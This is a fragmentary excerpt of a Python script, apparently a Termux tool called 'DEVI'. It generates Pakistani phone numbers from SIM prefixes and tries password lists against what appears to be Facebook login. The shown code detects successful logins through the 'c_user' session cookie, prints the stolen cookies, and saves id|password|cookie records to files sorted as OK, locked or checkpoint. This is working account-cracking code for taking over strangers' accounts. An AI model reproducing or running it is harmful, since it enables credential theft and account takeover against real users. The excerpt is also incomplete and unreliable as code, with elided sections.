...
try:
	os.mkdir('/sdcard/DEVI')
except:
	pass
if os.path.exists("/sdcard/DEVI"):
	pass
else:
...
def menu4(xrl):
	logo()
	print(P+f'PAKISTAN COUNTRY CODE : +92')
	print(P+f'NEP SIM CODE: {G}0300 0302 0321 0318'+W)
	code=input(P+f'Choice : '+G)
	print(P+f'EXAMPLE : {G}5000 10000 15000 20000'+W)
	try:
		limit = int(input(P+f'Put Limit : '+G))
...
def nrmlrm(id,psd,tid,xrl):
	...
	sys.stdout.write(f'\r\r[DEVI-XD] %s|OK:-{G}%s{W}|{S}%s{W}|{R}%s{W}   '%(lop,len(ok),len(lk),len(cp)));sys.stdout.flush()
	try:
		for psw in psd:
...
response = requests.get(
    ...
    'viewport-width': '980'
			...
			if 'c_user' in lcki:
				...
				if 'Locked' in check:
					print(f"\r\r\x1b[38;5;28m[DEVI-LK] {iid} | {psw}\x1b[1;97m")
					lk.append(id)
					open('/sdcard/DEVI/DEVI-R-H-LOCK.txt', 'a').write(iid+'|'+psw+'|'+coki+"\n")
					break
				else:
					print(f"\r\r\x1b[1;92m[DEVI-OK] {iid} | {psw}\x1b[0m")
					print(f"\r\r\x1b[1;92m[COOKIE] "+coki+"\n")
					ok.append(id)
					open('/sdcard/DEVI/DEVI-R-H-OK.txt', 'a').write(iid+'|'+psw+'|'+coki+"\n")
					break
				break
				...
				try:
					...
					iid=id
				cp.append(id)
				open('/sdcard/DEVI/R-CP.txt', 'a').write(iid+'|'+psw+"\n")
				break
			else:
				continue
		lop+=1
